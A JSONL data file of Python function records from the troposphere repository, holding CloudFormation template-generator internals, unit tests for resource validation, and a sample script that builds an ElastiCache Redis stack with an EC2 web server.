{"docstring": "\"\"\" Imports all troposphere modules and returns them \"\"\"\n", "func_signal": "def _import_all_troposphere_modules(self):\n", "code": "dirname = os.path.join(os.path.dirname(__file__))\nmodule_names = [\n    pkg_name\n    for importer, pkg_name, is_pkg in\n    pkgutil.walk_packages([dirname], prefix=\"troposphere.\")\n    if not is_pkg and pkg_name not in self.EXCLUDE_MODULES]\nmodule_names.append('troposphere')\n\nmodules = []\nfor name in module_names:\n    modules.append(importlib.import_module(name))\n\ndef members_predicate(m):\n    return inspect.isclass(m) and not inspect.isbuiltin(m)\n\nmembers = []\nfor module in modules:\n    members.extend((m[1] for m in inspect.getmembers(\n        module, members_predicate)))\n\nreturn set(members)", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"\nConverts any object to its troposphere equivalent, if applicable.\nThis function will recurse into lists and mappings to create\nadditional objects as necessary.\n\n:param {*} definition: Object to convert\n:param str ref: Name of key in parent dict that the provided definition\n                is from, can be None\n:param type cls: Troposphere class which represents provided definition\n\"\"\"\n", "func_signal": "def _convert_definition(self, definition, ref=None, cls=None):\n", "code": "if isinstance(definition, Mapping):\n    if 'Type' in definition:  # this is an AWS Resource\n        expected_type = None\n        if cls is not None:\n            expected_type = cls\n        else:\n            # if the user uses the custom way to name custom resources,\n            # we'll dynamically create a new subclass for this use and\n            # pass that instead of the typical CustomObject resource\n            try:\n                expected_type = self._generate_custom_type(\n                    definition['Type'])\n            except TypeError:\n                # If definition['Type'] turns out not to be a custom\n                # type (aka doesn't start with \"Custom::\")\n                if ref is not None:\n                    raise ResourceTypeNotFound(ref, definition['Type'])\n                else:\n                    # Make sure expected_type is nothing (as\n                    # it always should be)\n                    assert not expected_type\n\n        if expected_type:\n            args = self._normalize_properties(definition)\n            return self._create_instance(expected_type, args, ref)\n\n    if len(definition) == 1:  # This might be a function?\n        function_type = self._get_function_type(\n            definition.keys()[0])\n        if function_type:\n            return self._create_instance(\n                function_type, definition.values()[0])\n\n    # nothing special here - return as dict\n    d = {}\n    for k, v in definition.iteritems():\n        d[k] = self._convert_definition(v)\n    return d\n\nelif (isinstance(definition, Sequence) and\n        not isinstance(definition, basestring)):\n    return [self._convert_definition(v) for v in definition]\n\n# anything else is returned as-is\nreturn definition", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"\nInspects the definition and returns a copy of it that is updated\nwith any special property such as Condition, UpdatePolicy and the\nlike.\n\"\"\"\n", "func_signal": "def _normalize_properties(self, definition):\n", "code": "args = definition.get('Properties', {}).copy()\nif 'Condition' in definition:\n    args.update({'Condition': definition['Condition']})\nif 'UpdatePolicy' in definition:\n    # there's only 1 kind of UpdatePolicy; use it\n    args.update({'UpdatePolicy': self._create_instance(\n        UpdatePolicy, definition['UpdatePolicy'])})\nif 'CreationPolicy' in definition:\n    # there's only 1 kind of CreationPolicy; use it\n    args.update({'CreationPolicy': self._create_instance(\n        CreationPolicy, definition['CreationPolicy'])})\nif 'DeletionPolicy' in definition:\n    # DeletionPolicity is very basic\n    args.update(\n        {'DeletionPolicy': self._convert_definition(\n            definition['DeletionPolicy'])})\nif 'Metadata' in definition:\n    # there are various kind of metadata; pass it as-is\n    args.update(\n        {'Metadata': self._convert_definition(\n            definition['Metadata'])})\nif 'DependsOn' in definition:\n    args.update(\n        {'DependsOn': self._convert_definition(\n            definition['DependsOn'])})\nreturn args", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "# Check valid json dashboard string\n", "func_signal": "def test_dashboard(self):\n", "code": "dashboard = Dashboard(\n    \"dashboard\",\n    DashboardBody='{\"a\": \"b\"}',\n)\ndashboard.validate()\n\n# Check invalid json dashboard string\ndashboard = Dashboard(\n    \"dashboard\",\n    DashboardBody='{\"a: \"b\"}',\n)\nwith self.assertRaises(ValueError):\n    dashboard.validate()\n\n# Check accepting dict and converting to string in validate\nd = {\"c\": \"d\"}\ndashboard = Dashboard(\n    \"dashboard\",\n    DashboardBody=d\n)\ndashboard.validate()\nself.assertEqual(dashboard.properties['DashboardBody'], '{\"c\": \"d\"}')\n\n# Check invalid Dashboard type\nwith self.assertRaises(TypeError):\n    dashboard = Dashboard(\n        \"dashboard\",\n        DashboardBody=1\n    )", "path": "troposphere/tests/test_cloudwatch.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"\nCreate a ElastiCache Redis Node and EC2 Instance\n\"\"\"\n\n", "func_signal": "def main():\n", "code": "template = Template()\n\n# Description\ntemplate.set_description(\n    'AWS CloudFormation Sample Template ElastiCache_Redis:'\n    'Sample template showing how to create an Amazon'\n    'ElastiCache Redis Cluster. **WARNING** This template'\n    'creates an Amazon EC2 Instance and an Amazon ElastiCache'\n    'Cluster. You will be billed for the AWS resources used'\n    'if you create a stack from this template.')\n\n# Mappings\ntemplate.add_mapping('AWSInstanceType2Arch', {\n    't1.micro':     {'Arch': 'PV64'},\n    't2.micro':     {'Arch': 'HVM64'},\n    't2.small':     {'Arch': 'HVM64'},\n    't2.medium':    {'Arch': 'HVM64'},\n    'm1.small':     {'Arch': 'PV64'},\n    'm1.medium':    {'Arch': 'PV64'},\n    'm1.large':     {'Arch': 'PV64'},\n    'm1.xlarge':    {'Arch': 'PV64'},\n    'm2.xlarge':    {'Arch': 'PV64'},\n    'm2.2xlarge':   {'Arch': 'PV64'},\n    'm2.4xlarge':   {'Arch': 'PV64'},\n    'm3.medium':    {'Arch': 'HVM64'},\n    'm3.large':     {'Arch': 'HVM64'},\n    'm3.xlarge':    {'Arch': 'HVM64'},\n    'm3.2xlarge':   {'Arch': 'HVM64'},\n    'c1.medium':    {'Arch': 'PV64'},\n    'c1.xlarge':    {'Arch': 'PV64'},\n    'c3.large':     {'Arch': 'HVM64'},\n    'c3.xlarge':    {'Arch': 'HVM64'},\n    'c3.2xlarge':   {'Arch': 'HVM64'},\n    'c3.4xlarge':   {'Arch': 'HVM64'},\n    'c3.8xlarge':   {'Arch': 'HVM64'},\n    'c4.large':     {'Arch': 'HVM64'},\n    'c4.xlarge':    {'Arch': 'HVM64'},\n    'c4.2xlarge':   {'Arch': 'HVM64'},\n    'c4.4xlarge':   {'Arch': 'HVM64'},\n    'c4.8xlarge':   {'Arch': 'HVM64'},\n    'g2.2xlarge':   {'Arch': 'HVMG2'},\n    'r3.large':     {'Arch': 'HVM64'},\n    'r3.xlarge':    {'Arch': 'HVM64'},\n    'r3.2xlarge':   {'Arch': 'HVM64'},\n    'r3.4xlarge':   {'Arch': 'HVM64'},\n    'r3.8xlarge':   {'Arch': 'HVM64'},\n    'i2.xlarge':    {'Arch': 'HVM64'},\n    'i2.2xlarge':   {'Arch': 'HVM64'},\n    'i2.4xlarge':   {'Arch': 'HVM64'},\n    'i2.8xlarge':   {'Arch': 'HVM64'},\n    'd2.xlarge':    {'Arch': 'HVM64'},\n    'd2.2xlarge':   {'Arch': 'HVM64'},\n    'd2.4xlarge':   {'Arch': 'HVM64'},\n    'd2.8xlarge':   {'Arch': 'HVM64'},\n    'hi1.4xlarge':  {'Arch': 'HVM64'},\n    'hs1.8xlarge':  {'Arch': 'HVM64'},\n    'cr1.8xlarge':  {'Arch': 'HVM64'},\n    'cc2.8xlarge':  {'Arch': 'HVM64'}\n    })\n\ntemplate.add_mapping('AWSRegionArch2AMI', {\n    'us-east-1': {'PV64': 'ami-0f4cfd64',\n                  'HVM64': 'ami-0d4cfd66',\n                  'HVMG2': 'ami-5b05ba30'},\n    'us-west-2': {'PV64': 'ami-d3c5d1e3',\n                  'HVM64': 'ami-d5c5d1e5',\n                  'HVMG2': 'ami-a9d6c099'},\n    'us-west-1': {'PV64': 'ami-85ea13c1',\n                  'HVM64': 'ami-87ea13c3',\n                  'HVMG2': 'ami-37827a73'},\n    'eu-west-1': {'PV64': 'ami-d6d18ea1',\n                  'HVM64': 'ami-e4d18e93',\n                  'HVMG2': 'ami-72a9f105'},\n    'eu-central-1': {'PV64': 'ami-a4b0b7b9',\n                     'HVM64': 'ami-a6b0b7bb',\n                     'HVMG2': 'ami-a6c9cfbb'},\n    'ap-northeast-1': {'PV64': 'ami-1a1b9f1a',\n                       'HVM64': 'ami-1c1b9f1c',\n                       'HVMG2': 'ami-f644c4f6'},\n    'ap-southeast-1': {'PV64': 'ami-d24b4280',\n                       'HVM64': 'ami-d44b4286',\n                       'HVMG2': 'ami-12b5bc40'},\n    'ap-southeast-2': {'PV64': 'ami-ef7b39d5',\n                       'HVM64': 'ami-db7b39e1',\n                       'HVMG2': 'ami-b3337e89'},\n    'sa-east-1': {'PV64': 'ami-5b098146',\n                  'HVM64': 'ami-55098148',\n                  'HVMG2': 'NOT_SUPPORTED'},\n    'cn-north-1': {'PV64': 'ami-bec45887',\n                   'HVM64': 'ami-bcc45885',\n                   'HVMG2': 'NOT_SUPPORTED'}\n    })\n\ntemplate.add_mapping('Region2Principal', {\n    'us-east-1': {'EC2Principal': 'ec2.amazonaws.com',\n                  'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n    'us-west-2': {'EC2Principal': 'ec2.amazonaws.com',\n                  'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n    'us-west-1': {'EC2Principal': 'ec2.amazonaws.com',\n                  'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n    'eu-west-1': {'EC2Principal': 'ec2.amazonaws.com',\n                  'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n    'ap-southeast-1': {'EC2Principal': 'ec2.amazonaws.com',\n                       'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n    'ap-northeast-1': {'EC2Principal': 'ec2.amazonaws.com',\n                       'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n    'ap-southeast-2': {'EC2Principal': 'ec2.amazonaws.com',\n                       'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n    'sa-east-1': {'EC2Principal': 'ec2.amazonaws.com',\n                  'OpsWorksPrincipal': 'opsworks.amazonaws.com'},\n    'cn-north-1': {'EC2Principal': 'ec2.amazonaws.com.cn',\n                   'OpsWorksPrincipal': 'opsworks.amazonaws.com.cn'},\n    'eu-central-1': {'EC2Principal': 'ec2.amazonaws.com',\n                     'OpsWorksPrincipal': 'opsworks.amazonaws.com'}\n    })\n\n# Parameters\ncachenodetype = template.add_parameter(Parameter(\n    'ClusterNodeType',\n    Description='The compute and memory capacity of the nodes in the Redis'\n                ' Cluster',\n    Type='String',\n    Default='cache.m1.small',\n    AllowedValues=['cache.m1.small',\n                   'cache.m1.large',\n                   'cache.m1.xlarge',\n                   'cache.m2.xlarge',\n                   'cache.m2.2xlarge',\n                   'cache.m2.4xlarge',\n                   'cache.c1.xlarge'],\n    ConstraintDescription='must select a valid Cache Node type.',\n    ))\n\ninstancetype = template.add_parameter(Parameter(\n    'InstanceType',\n    Description='WebServer EC2 instance type',\n    Type='String',\n    Default='t2.micro',\n    AllowedValues=['t1.micro',\n                   't2.micro',\n                   't2.small',\n                   't2.medium',\n                   'm1.small',\n                   'm1.medium',\n                   'm1.large',\n                   'm1.xlarge',\n                   'm2.xlarge',\n                   'm2.2xlarge',\n                   'm2.4xlarge',\n                   'm3.medium',\n                   'm3.large',\n                   'm3.xlarge',\n                   'm3.2xlarge',\n                   'c1.medium',\n                   'c1.xlarge',\n                   'c3.large',\n                   'c3.xlarge',\n                   'c3.2xlarge',\n                   'c3.4xlarge',\n                   'c3.8xlarge',\n                   'c4.large',\n                   'c4.xlarge',\n                   'c4.2xlarge',\n                   'c4.4xlarge',\n                   'c4.8xlarge',\n                   'g2.2xlarge',\n                   'r3.large',\n                   'r3.xlarge',\n                   'r3.2xlarge',\n                   'r3.4xlarge',\n                   'r3.8xlarge',\n                   'i2.xlarge',\n                   'i2.2xlarge',\n                   'i2.4xlarge',\n                   'i2.8xlarge',\n                   'd2.xlarge',\n                   'd2.2xlarge',\n                   'd2.4xlarge',\n                   'd2.8xlarge',\n                   'hi1.4xlarge',\n                   'hs1.8xlarge',\n                   'cr1.8xlarge',\n                   'cc2.8xlarge',\n                   'cg1.4xlarge'],\n    ConstraintDescription='must be a valid EC2 instance type.',\n    ))\n\nkeyname = template.add_parameter(Parameter(\n    'KeyName',\n    Description='Name of an existing EC2 KeyPair to enable SSH access'\n                ' to the instance',\n    Type='AWS::EC2::KeyPair::KeyName',\n    ConstraintDescription='must be the name of an existing EC2 KeyPair.',\n    ))\n\nsshlocation = template.add_parameter(Parameter(\n    'SSHLocation',\n    Description='The IP address range that can be used to SSH to'\n                ' the EC2 instances',\n    Type='String',\n    MinLength='9',\n    MaxLength='18',\n    Default='0.0.0.0/0',\n    AllowedPattern='(\\\\d{1,3})\\\\.(\\\\d{1,3})\\\\.'\n                   '(\\\\d{1,3})\\\\.(\\\\d{1,3})/(\\\\d{1,2})',\n    ConstraintDescription='must be a valid IP CIDR range of the'\n                          ' form x.x.x.x/x.'\n    ))\n\n# Resources\nwebserverrole = template.add_resource(iam.Role(\n    'WebServerRole',\n    AssumeRolePolicyDocument=PolicyDocument(\n        Statement=[\n            Statement(\n                Effect=Allow,\n                Action=[AssumeRole],\n                Principal=Principal('Service',\n                                    [FindInMap('Region2Principal',\n                                               Ref('AWS::Region'),\n                                               'EC2Principal')]),\n                )\n            ]\n        ),\n    Path='/',\n))\n\ntemplate.add_resource(iam.PolicyType(\n    'WebServerRolePolicy',\n    PolicyName='WebServerRole',\n    PolicyDocument=PolicyDocument(\n        Statement=[awacs.aws.Statement(\n            Action=[awacs.aws.Action(\"elasticache\",\n                    \"DescribeCacheClusters\")],\n            Resource=[\"*\"],\n            Effect=awacs.aws.Allow\n        )]\n    ),\n    Roles=[Ref(webserverrole)],\n))\n\nwebserverinstanceprofile = template.add_resource(iam.InstanceProfile(\n    'WebServerInstanceProfile',\n    Path='/',\n    Roles=[Ref(webserverrole)],\n))\n\nwebserversg = template.add_resource(ec2.SecurityGroup(\n    'WebServerSecurityGroup',\n    GroupDescription='Enable HTTP and SSH access',\n    SecurityGroupIngress=[\n        ec2.SecurityGroupRule(\n            IpProtocol='tcp',\n            FromPort='22',\n            ToPort='22',\n            CidrIp=Ref(sshlocation),\n            ),\n        ec2.SecurityGroupRule(\n            IpProtocol='tcp',\n            FromPort='80',\n            ToPort='80',\n            CidrIp='0.0.0.0/0',\n            )\n        ]\n    ))\n\nwebserverinstance = template.add_resource(ec2.Instance(\n    'WebServerInstance',\n    Metadata=cloudformation.Metadata(\n        cloudformation.Init({\n            'config': cloudformation.InitConfig(\n                packages={\n                    'yum': {\n                        'httpd':     [],\n                        'php':       [],\n                        'php-devel': [],\n                        'gcc':       [],\n                        'make':      []\n                        }\n                    },\n\n                files=cloudformation.InitFiles({\n                    '/var/www/html/index.php': cloudformation.InitFile(\n                        content=Join('', [\n                            '<?php\\n',\n                            'echo \\\"<h1>AWS CloudFormation sample'\n                            ' application for Amazon ElastiCache'\n                            ' Redis Cluster</h1>\\\";\\n',\n                            '\\n',\n                            '$cluster_config = json_decode('\n                            'file_get_contents(\\'/tmp/cacheclusterconfig\\''\n                            '), true);\\n',\n                            '$endpoint = $cluster_config[\\'CacheClusters'\n                            '\\'][0][\\'CacheNodes\\'][0][\\'Endpoint\\'][\\'Add'\n                            'ress\\'];\\n',\n                            '$port = $cluster_config[\\'CacheClusters\\'][0]'\n                            '[\\'CacheNodes\\'][0][\\'Endpoint\\'][\\'Port\\'];'\n                            '\\n',\n                            '\\n',\n                            'echo \\\"<p>Connecting to Redis Cache Cluster '\n                            'node \\'{$endpoint}\\' on port {$port}</p>\\\";'\n                            '\\n',\n                            '\\n',\n                            '$redis=new Redis();\\n',\n                            '$redis->connect($endpoint, $port);\\n',\n                            '$redis->set(\\'testkey\\', \\'Hello World!\\');'\n                            '\\n',\n                            '$return = $redis->get(\\'testkey\\');\\n',\n                            '\\n',\n                            'echo \\\"<p>Retrieved value: $return</p>\\\";'\n                            '\\n',\n                            '?>\\n'\n                            ]),\n                        mode='000644',\n                        owner='apache',\n                        group='apache'\n                        ),\n                    '/etc/cron.d/get_cluster_config':\n                        cloudformation.InitFile(\n                            content='*/5 * * * * root'\n                                    ' /usr/local/bin/get_cluster_config',\n                            mode='000644',\n                            owner='root',\n                            group='root'\n                            ),\n                    '/usr/local/bin/get_cluster_config':\n                        cloudformation.InitFile(\n                            content=Join('', [\n                                '#! /bin/bash\\n',\n                                'aws elasticache describe-cache-clusters ',\n                                '         --cache-cluster-id ',\n                                Ref('RedisCluster'),\n                                '         --show-cache-node-info'\n                                ' --region ', Ref('AWS::Region'),\n                                ' > /tmp/cacheclusterconfig\\n'\n                                ]),\n                            mode='000755',\n                            owner='root',\n                            group='root'\n                            ),\n                    '/usr/local/bin/install_phpredis':\n                        cloudformation.InitFile(\n                            content=Join('', [\n                                '#! /bin/bash\\n',\n                                'cd /tmp\\n',\n                                'wget https://github.com/nicolasff/'\n                                'phpredis/zipball/master -O phpredis.zip'\n                                '\\n',\n                                'unzip phpredis.zip\\n',\n                                'cd nicolasff-phpredis-*\\n',\n                                'phpize\\n',\n                                './configure\\n',\n                                'make && make install\\n',\n                                'touch /etc/php.d/redis.ini\\n',\n                                'echo extension=redis.so > /etc/php.d/'\n                                'redis.ini\\n'\n                                ]),\n                            mode='000755',\n                            owner='root',\n                            group='root'\n                            ),\n                    '/etc/cfn/cfn-hup.conf': cloudformation.InitFile(\n                        content=Join('', [\n                            '[main]\\n',\n                            'stack=', Ref('AWS::StackId'), '\\n',\n                            'region=', Ref('AWS::Region'), '\\n'\n                            ]),\n                        mode='000400',\n                        owner='root',\n                        group='root'\n                        ),\n                    '/etc/cfn/hooks.d/cfn-auto-reloader.conf':\n                        cloudformation.InitFile(\n                            content=Join('', [\n                                '[cfn-auto-reloader-hook]\\n',\n                                'triggers=post.update\\n',\n                                'path=Resources.WebServerInstance.Metadata'\n                                '.AWS::CloudFormation::Init\\n',\n                                'action=/opt/aws/bin/cfn-init -v ',\n                                '         --stack ', Ref('AWS::StackName'),\n                                '         --resource WebServerInstance ',\n                                '         --region ', Ref('AWS::Region'),\n                                '\\n',\n                                'runas=root\\n'\n                                ]),\n                            # Why doesn't the Amazon template have this?\n                            # mode='000400',\n                            # owner='root',\n                            # group='root'\n                            ),\n                    }),\n\n                commands={\n                    '01-install_phpredis': {\n                        'command': '/usr/local/bin/install_phpredis'\n                        },\n                    '02-get-cluster-config': {\n                        'command': '/usr/local/bin/get_cluster_config'\n                        }\n                    },\n\n                services={\n                    \"sysvinit\": cloudformation.InitServices({\n                        \"httpd\": cloudformation.InitService(\n                            enabled=True,\n                            ensureRunning=True,\n                            ),\n                        \"cfn-hup\": cloudformation.InitService(\n                            enabled=True,\n                            ensureRunning=True,\n                            files=['/etc/cfn/cfn-hup.conf',\n                                   '/etc/cfn/hooks.d/'\n                                   'cfn-auto-reloader.conf']\n                            ),\n                        }),\n                    },\n                )\n            })\n        ),\n    ImageId=FindInMap('AWSRegionArch2AMI', Ref('AWS::Region'),\n                      FindInMap('AWSInstanceType2Arch',\n                                Ref(instancetype), 'Arch')),\n    InstanceType=Ref(instancetype),\n    SecurityGroups=[Ref(webserversg)],\n    KeyName=Ref(keyname),\n    IamInstanceProfile=Ref(webserverinstanceprofile),\n    UserData=Base64(Join('', [\n        '#!/bin/bash -xe\\n',\n        'yum update -y aws-cfn-bootstrap\\n',\n\n        '# Setup the PHP sample application\\n',\n        '/opt/aws/bin/cfn-init -v ',\n        '         --stack ', Ref('AWS::StackName'),\n        '         --resource WebServerInstance ',\n        '         --region ', Ref('AWS::Region'), '\\n',\n\n        '# Signal the status of cfn-init\\n',\n        '/opt/aws/bin/cfn-signal -e $? ',\n        '         --stack ', Ref('AWS::StackName'),\n        '         --resource WebServerInstance ',\n        '         --region ', Ref('AWS::Region'), '\\n'\n        ])),\n    CreationPolicy=CreationPolicy(\n        ResourceSignal=ResourceSignal(Timeout='PT15M')\n        ),\n    Tags=Tags(Application=Ref('AWS::StackId'),\n              Details='Created using Troposhpere')\n    ))\n\nredisclustersg = template.add_resource(elasticache.SecurityGroup(\n    'RedisClusterSecurityGroup',\n    Description='Lock the cluster down',\n    ))\n\ntemplate.add_resource(elasticache.SecurityGroupIngress(\n    'RedisClusterSecurityGroupIngress',\n    CacheSecurityGroupName=Ref(redisclustersg),\n    EC2SecurityGroupName=Ref(webserversg),\n    ))\n\ntemplate.add_resource(elasticache.CacheCluster(\n    'RedisCluster',\n    Engine='redis',\n    CacheNodeType=Ref(cachenodetype),\n    NumCacheNodes='1',\n    CacheSecurityGroupNames=[Ref(redisclustersg)],\n    ))\n\n# Outputs\ntemplate.add_output([\n    Output(\n        'WebsiteURL',\n        Description='Application URL',\n        Value=Join('', [\n            'http://',\n            GetAtt(webserverinstance, 'PublicDnsName'),\n\n            ])\n        )\n    ])\n\n# Print CloudFormation Template\nprint(template.to_json())", "path": "troposphere/examples/ElastiCacheRedis.py", "commit_date": "2019-07-16 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"\nReturns an instance of `cls` with `args` passed as arguments.\n\nRecursively inspects `args` to create nested objects and functions as\nnecessary.\n\n`cls` will only be considered only if it's an object we track\n (i.e.: troposphere objects).\n\nIf `cls` has a `props` attribute, nested properties will be\n instanciated as troposphere Property objects as necessary.\n\nIf `cls` is a list and contains a single troposphere type, the\n returned value will be a list of instances of that type.\n\"\"\"\n", "func_signal": "def _create_instance(self, cls, args, ref=None):\n", "code": "if isinstance(cls, Sequence):\n    if len(cls) == 1:\n        # a list of 1 type means we must provide a list of such objects\n        if (isinstance(args, basestring) or\n                not isinstance(args, Sequence)):\n            args = [args]\n        return [self._create_instance(cls[0], v) for v in args]\n\nif isinstance(cls, Sequence)\\\n   or cls not in self.inspect_members.union(self._custom_members):\n    # this object doesn't map to any known object. could be a string\n    # or int, or a Ref... or a list of types such as\n    # [basestring, FindInMap, Ref] or maybe a\n    # validator such as `integer` or `port_range`\n    return self._convert_definition(args)\n\nelif issubclass(cls, AWSHelperFn):\n    # special handling for functions, we want to handle it before\n    # entering the other conditions.\n    try:\n        if issubclass(cls, Tags):\n            arg_dict = {}\n            for d in args:\n                arg_dict[d['Key']] = d['Value']\n            return cls(arg_dict)\n\n        if (isinstance(args, Sequence) and\n                not isinstance(args, basestring)):\n            return cls(*self._convert_definition(args))\n\n        if issubclass(cls, autoscaling.Metadata):\n            return self._generate_autoscaling_metadata(cls, args)\n\n        if issubclass(cls, Export):\n            return cls(args['Name'])\n\n        args = self._convert_definition(args)\n        if isinstance(args, Ref) and issubclass(cls, Ref):\n            # watch out for double-refs...\n            # this can happen if an object's .props has 'Ref'\n            # as the expected type (which is wrong and should be\n            # changed to basestring!)\n            return args\n\n        return cls(args)\n\n    except TypeError as ex:\n        if '__init__() takes exactly' not in ex.message:\n            raise\n        # special AWSHelperFn typically take lowercased parameters,\n        # but templates use uppercase. for this reason we cannot\n        # map to most of them, so we fallback with a generic one.\n        # this might not work for all types if they do extra\n        # processing in their init routine\n        return GenericHelperFn(args)\n\nelif isinstance(args, Mapping):\n    # we try to build as many troposphere objects as we can by\n    # inspecting its type validation metadata\n    kwargs = {}\n    kwargs.update(args)\n    for prop_name in getattr(cls, 'props', []):\n        if prop_name not in kwargs:\n            continue  # the user did not specify this value; skip it\n        expected_type = cls.props[prop_name][0]\n\n        if (isinstance(expected_type, Sequence) or\n                expected_type in self.inspect_members):\n            kwargs[prop_name] = self._create_instance(\n                expected_type, kwargs[prop_name], prop_name)\n        else:\n            kwargs[prop_name] = self._convert_definition(\n                kwargs[prop_name], prop_name)\n\n    args = self._convert_definition(kwargs)\n    if isinstance(args, Ref):\n        # use the returned ref instead of creating a new object\n        return args\n    if isinstance(args, AWSHelperFn):\n        return self._convert_definition(kwargs)\n    assert isinstance(args, Mapping)\n    return cls(title=ref, **args)\n\nreturn cls(self._convert_definition(args))", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "# Check with no schema\n", "func_signal": "def test_schema(self):\n", "code": "model = Model(\n    \"schema\",\n    RestApiId=\"apiid\",\n)\nmodel.validate()\n\n# Check valid json schema string\nmodel = Model(\n    \"schema\",\n    RestApiId=\"apiid\",\n    Schema='{\"a\": \"b\"}',\n)\nmodel.validate()\n\n# Check invalid json schema string\nmodel = Model(\n    \"schema\",\n    RestApiId=\"apiid\",\n    Schema='{\"a: \"b\"}',\n)\nwith self.assertRaises(ValueError):\n    model.validate()\n\n# Check accepting dict and converting to string in validate\nd = {\"c\": \"d\"}\nmodel = Model(\n    \"schema\",\n    RestApiId=\"apiid\",\n    Schema=d\n)\nmodel.validate()\nself.assertEqual(model.properties['Schema'], '{\"c\": \"d\"}')\n\n# Check invalid Schema type\nwith self.assertRaises(TypeError):\n    model = Model(\n        \"schema\",\n        RestApiId=\"apiid\",\n        Schema=1\n    )\n\n# Check Schema being an AWSHelperFn\nmodel = Model(\n    \"schema\",\n    RestApiId=\"apiid\",\n    Schema=Join(':', ['{\"a', ': \"b\"}']),\n)\nmodel.validate()", "path": "troposphere/tests/test_apigateway.py", "commit_date": "2017-08-23 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"Attempts to return troposphere class that represents Type of\nprovided resource. Attempts to find the troposphere class who's\n`resource_type` field is the same as the provided resources `Type`\nfield.\n\n:param resource: Resource to find troposphere class for\n:return: None: If no class found for provided resource\n         type: Type of provided resource\n:raise ResourceTypeNotDefined:\n          Provided resource does not have a `Type` field\n\"\"\"\n# If provided resource does not have `Type` field\n", "func_signal": "def _get_resource_type_cls(self, name, resource):\n", "code": "if 'Type' not in resource:\n    raise ResourceTypeNotDefined(name)\n\n# Attempt to find troposphere resource with:\n#   `resource_type` == resource['Type']\ntry:\n    return self.inspect_resources[resource['Type']]\nexcept KeyError:\n    # is there a custom mapping?\n    for custom_member in self._custom_members:\n        if custom_member.resource_type == resource['Type']:\n            return custom_member\n    # If no resource with `resource_type` == resource['Type'] found\n    return None", "path": "troposphere/troposphere/template_generator.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "# test for no CodeUri or InlineCode\n", "func_signal": "def test_packaging(self):\n", "code": "t = Template()\nt.add_resource(\n    FunctionForPackaging(\n        \"ProcessorFunction\",\n        Handler='process_file.handler',\n        Runtime='python3.6',\n        Policies={\n            \"Statement\": [{\n                \"Effect\": \"Allow\",\n                \"Action\": [\"s3:GetObject\", \"s3:PutObject\"],\n                \"Resource\": [\"arn:aws:s3:::bucket/*\"],\n            }]\n        },\n    )\n)\nt.to_json()", "path": "troposphere/tests/test_serverless.py", "commit_date": "2020-10-04 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "\"\"\"\nEnsures that all example outputs can be loaded into the\ntemplate generator and back to JSON with no difference.\n\"\"\"\n# we first get both outputs as JSON strings\n", "func_signal": "def test_template_generator(self):\n", "code": "template = self.expected_output\ngenerated = TemplateGenerator(json.loads(template)).to_json()\n\n# then we make them into a dict for comparison\ntemplate = json.loads(template)\ngenerated = json.loads(generated)\n\nself.assertDictEqual(template, generated)", "path": "troposphere/tests/test_examples_template_generator.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
{"docstring": "# Check with no schema\n", "func_signal": "def test_schema(self):\n", "code": "model = Model(\n    \"schema\",\n    Name=\"model\",\n    ApiId=\"apiid\",\n)\nmodel.validate()\n\n# Check valid json schema string\nmodel = Model(\n    \"schema\",\n    ApiId=\"apiid\",\n    Name=\"model\",\n    Schema='{\"a\": \"b\"}',\n)\nmodel.validate()\n\n# Check invalid json schema string\nmodel = Model(\n    \"schema\",\n    ApiId=\"apiid\",\n    Name=\"model\",\n    Schema='{\"a: \"b\"}',\n)\nwith self.assertRaises(ValueError):\n    model.validate()\n\n# Check accepting dict and converting to string in validate\nd = {\"c\": \"d\"}\nmodel = Model(\n    \"schema\",\n    ApiId=\"apiid\",\n    Name=\"model\",\n    Schema=d\n)\nmodel.validate()\nself.assertEqual(model.properties['Schema'], '{\"c\": \"d\"}')\n\n# Check invalid Schema type\nwith self.assertRaises(TypeError):\n    model = Model(\n        \"schema\",\n        ApiId=\"apiid\",\n        Name=\"model\",\n        Schema=1\n    )\n\n# Check Schema being an AWSHelperFn\nmodel = Model(\n    \"schema\",\n    ApiId=\"apiid\",\n    Name=\"model\",\n    Schema=Join(':', ['{\"a', ': \"b\"}']),\n)\nmodel.validate()", "path": "troposphere/tests/test_apigatewayv2.py", "commit_date": "2019-02-13 00:00:00", "repo_name": "cloudtools/troposphere", "stars": 4887, "license": "bsd-2-clause", "language": "python", "size": 5445}
